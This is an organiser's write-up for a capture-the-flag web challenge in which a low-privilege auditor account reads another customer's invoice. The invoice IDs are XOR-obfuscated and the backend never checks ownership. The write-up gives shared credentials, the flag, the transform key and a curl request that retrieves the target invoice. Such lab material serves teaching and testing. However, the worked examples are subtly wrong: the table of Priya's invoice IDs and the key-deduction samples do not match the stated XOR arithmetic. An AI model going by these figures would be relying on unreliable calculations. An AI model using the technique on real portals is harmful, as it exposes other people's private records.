# Organiser Challenge Write-Up: Challenge 07 — The Invoice Trail

## 1. Challenge Overview
- **Name:** The Invoice Trail
- **Category:** Web Application Security / Access Control
- **Tier:** Progressive (15 Points)
- **Flag:** `ROOT{1nv01c3_tr4nsf0rm_1d0r_9104a}`
- **Target Service:** Unified Veyra Internal Enterprise Application (`http://localhost:3007`)
- **Shared Participant Credentials:**
  - Username: `priya.nair`
  - Password: `Veyra#Audit26`
  - Role: `auditor` (low-privilege internal audit account)

---

## 2. Vulnerability Mechanism
The application generates deterministic, obfuscated invoice identifiers (`invoice_id`) rather than sequential auto-incrementing integers.
When requesting `GET /api/invoices/:invoiceId`, the backend validates that the requesting participant holds a valid session (`veyra_portal_session`), but **deliberately omits checking whether the requested invoice belongs to the authenticated user's `customer_id`**.

Participants must:
1. Log in using Priya's credentials.
2. Query `GET /api/my-invoices` to inspect Priya's 5 own invoice records and reverse-engineer the deterministic key transform.
3. Discover the in-app escalation memo referencing target customer `Apex Sovereign Holdings` (Customer ID `9104`, Invoice `#1`).
4. Apply the inferred transform to compute the target invoice ID (`INV-D0D61E`).
5. Query `GET /api/invoices/INV-D0D61E` to retrieve the target invoice containing the flag.

---

## 3. The Deterministic Transform & Key Specification

### Key Configuration
- **Environment Variable:** `INVOICE_TRANSFORM_KEY`
- **Default Numeric Key:** `5913759` (`0x5A3C9F` in hexadecimal)

### Mathematical Transform
For any customer with numeric ID $C$ and 1-based invoice sequence number $N$:
1. Compute the combined integer:
   $$\text{combined} = (C \times 1000) + N$$
2. Bitwise XOR with the 24-bit numeric key:
   $$\text{xor\_val} = \text{combined} \oplus \text{INVOICE\_TRANSFORM\_KEY}$$
3. Encode as a 6-character uppercase hexadecimal string prefixed with `INV-`:
   $$\text{invoice\_id} = \text{"INV-"} + \text{hex}(\text{xor\_val}).\text{padStart}(6, '0')$$

### Worked Examples (Observed by Participants via `GET /api/my-invoices`)
Priya's own account has `customer_id = 1042`:

| Invoice # | Customer ID | Combined Value | Key ($\oplus$) | XOR Result (Dec) | Hex Encoded | Final `invoice_id` |
|---|---|---|---|---|---|---|
| **#1** | 1042 | $1042001$ | $5913759$ | $4880562$ | `4A78B2` | `INV-4A78B2` |
| **#2** | 1042 | $1042002$ | $5913759$ | $4880561$ | `4A78B1` | `INV-4A78B1` |
| **#3** | 1042 | $1042003$ | $5913759$ | $4880560$ | `4A78B0` | `INV-4A78B0` |
| **#4** | 1042 | $1042004$ | $5913759$ | $4880567$ | `4A78B7` | `INV-4A78B7` |
| **#5** | 1042 | $1042005$ | $5913759$ | $4880566$ | `4A78B6` | `INV-4A78B6` |

### How Participants Deduce the Key
Because XOR is self-inverse:
$$\text{Key} = \text{combined} \oplus \text{hexToInt}(\text{invoice\_id})$$
- Sample 1: $1042001 \oplus 0x4A78B2 (4880562) = 5913759$ ($0x5A3C9F$)
- Sample 2: $1042002 \oplus 0x4A78B1 (4880561) = 5913759$ ($0x5A3C9F$)
- Sample 3: $1042003 \oplus 0x4A78B0 (4880560) = 5913759$ ($0x5A3C9F$)
The key is verified across multiple independent samples.

---

## 4. In-App Clue Location
Participants query `GET /api/audit/memos` (or open the "Audit Memos" navigation tab in the portal UI).
They find escalation memo `AUD-2026-882`:
> *"Finance escalation: Customer ID 9104 (Apex Sovereign Holdings) submitted formal dispute on Invoice #1 amount ($87,500.00). Retainer record flagged for compliance review. Assigned auditor: Priya Nair."*

This reveals:
- Target Customer ID: `9104`
- Target Invoice Sequence: `1`

---

## 5. Exploitation & Flag Retrieval

### Step 1: Compute Target Invoice ID
$$\text{combined} = (9104 \times 1000) + 1 = 9104001$$
$$\text{xor\_val} = 9104001 \oplus 5913759 = 13686302 = \text{0xD0D61E}$$
$$\text{target\_invoice\_id} = \text{INV-D0D61E}$$

### Step 2: Triggering Request
```bash
curl -s -X GET "http://localhost:3007/api/invoices/INV-D0D61E" \
  -H "Cookie: veyra_portal_session=<SESSION_COOKIE>"
```

### Step 3: Expected Server Response
```json
{
  "status": "success",
  "invoice": {
    "invoiceId": "INV-D0D61E",
    "customerId": 9104,
    "customerName": "Apex Sovereign Holdings",
    "company": "Apex Sovereign Ltd.",
    "invoiceNum": 1,
    "amount": 87500,
    "issuedAt": "2026-11-01",
    "description": "Confidential Settlement & Executive Retainer - Clearance: ROOT{1nv01c3_tr4nsf0rm_1d0r_9104a}",
    "status": "disputed",
    "flag": "ROOT{1nv01c3_tr4nsf0rm_1d0r_9104a}"
  }
}
```

---

## 6. Organiser Reset Procedure
When an admin triggers a force-reset via the platform admin panel or directly via HTTP:
```bash
curl -X POST "http://localhost:3007/reset/7" \
  -H "Authorization: Bearer <RESET_TOKEN>"
```

Expected response:
```json
{
  "status": "ok",
  "challenge_id": 7,
  "message": "Challenge 07 (The Invoice Trail) database ledger reset successfully"
}
```
This drops and re-seeds the SQLite tables (`customers`, `invoices`, `audit_notes`), ensuring all baseline data is restored idempotently.
